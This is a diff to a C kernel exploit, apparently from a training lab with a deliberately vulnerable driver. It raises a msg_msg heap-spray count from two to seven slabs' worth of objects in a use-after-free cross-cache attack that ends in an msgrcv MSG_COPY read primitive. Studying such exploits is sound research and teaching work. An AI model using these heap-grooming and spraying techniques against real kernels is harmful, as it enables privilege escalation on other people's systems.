@@ -87,7 +87,7 @@ int act(int act_fd, int code, int n, char *args)
  *  - create new active slab, allocate objs_per_slab objects
  *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
  *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
- *  - allocate (objs_per_slab * 2) target objects to create and fill new target slab
+ *  - allocate (objs_per_slab * 7) target objects to create and fill new target slab
  *  - perform uaf write using the dangling reference
  *  - execute the exploit primitive via the overwritten target object
  */
@@ -244,8 +244,8 @@ int main(void)
 	assert(reserved_from_n + i - 1 == current_n);
 	printf("[+] done, now go spraying\n");
 
-	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
-	for (i = 0; i < OBJS_PER_SLAB * 2; i++) {
+	printf("[!] allocate (objs_per_slab * 7) target objects to create and fill new target slab\n");
+	for (i = 0; i < OBJS_PER_SLAB * 7; i++) {
 		ret = msgsnd(msqid, &msg_oob_r, sizeof(msg_oob_r.mtext), 0);
 		if (ret) {
 			perror("[-] realloc msgsnd");
@@ -276,7 +276,7 @@ int main(void)
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
 	printf("[!] execute the exploit primitive via the overwritten target object\n");
-	for (i = 0; i < OBJS_PER_SLAB * 2; i++) {
+	for (i = 0; i < OBJS_PER_SLAB * 7; i++) {
 		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, i, IPC_NOWAIT | MSG_COPY);
 		if (bytes == -1) {
 			perror("[-] msgrcv MSG_COPY");
